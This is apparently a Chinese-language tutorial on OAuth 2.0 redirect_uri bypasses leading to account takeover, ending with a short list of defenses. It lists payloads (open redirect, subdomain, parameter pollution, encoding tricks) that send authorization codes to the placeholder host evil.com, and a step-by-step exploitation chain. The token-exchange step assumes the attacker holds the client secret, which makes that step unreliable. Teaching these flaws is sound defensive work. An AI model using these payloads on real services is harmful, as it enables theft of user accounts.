OAuth 2.0 redirect_uri 绕过 → 账户劫持

概述

OAuth 2.0是一种广泛使用的授权协议，允许第三方应用获取用户资源。然而，如果redirect_uri校验不严格，攻击者可以窃取授权码，实现账户接管（ATO）。

🐱 猫猫提示：OAuth就像借猫粮，但如果不检查谁来借，猫粮就被偷走啦~

OAuth流程

标准的授权码流程：

1. 用户点击"登录"
2. 重定向到授权服务器:
   https://auth.com/authorize?
     client_id=CLIENT_ID&
     redirect_uri=https://app.com/callback&
     response_type=code&
     state=xyz

3. 用户授权后，重定向回应用:
   https://app.com/callback?code=AUTH_CODE&state=xyz

4. 应用用code换取access_token

漏洞原理

如果授权服务器对redirect_uri校验不严格，攻击者可以修改它：

# 原始请求
redirect_uri=https://app.com/callback

# 篡改后
redirect_uri=https://evil.com/callback

用户授权后，code会被发送到攻击者的服务器。

绕过技巧

1. 开放重定向

# 利用目标站点的开放重定向
redirect_uri=https://app.com/redirect?url=https://evil.com

# 路径遍历
redirect_uri=https://app.com/callback/../evil

2. 子域名绕过

# 如果只校验顶级域名
redirect_uri=https://evil.app.com/callback

3. 参数污染

# 重复参数
redirect_uri=https://app.com/callback&redirect_uri=https://evil.com

4. 编码绕过

# URL编码
redirect_uri=https://app.com%2F@evil.com

# 双重编码
redirect_uri=https://app.com%252F@evil.com

完整利用

# 1. 构造恶意链接
https://auth.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://evil.com/callback&
  response_type=code&
  state=xyz

# 2. 发送给受害者

# 3. 受害者点击并授权

# 4. 接收code
GET /callback?code=STOLEN_CODE&state=xyz

# 5. 用code换取token
POST https://auth.com/token
  grant_type=authorization_code&
  code=STOLEN_CODE&
  redirect_uri=https://evil.com/callback&
  client_id=CLIENT_ID&
  client_secret=SECRET

# 6. 用token获取用户信息，完成账户劫持

防御方案

  • 严格校验redirect_uri，使用精确匹配
  • 不要使用通配符或正则匹配
  • 验证state参数防止CSRF
  • 使用PKCE增强安全性
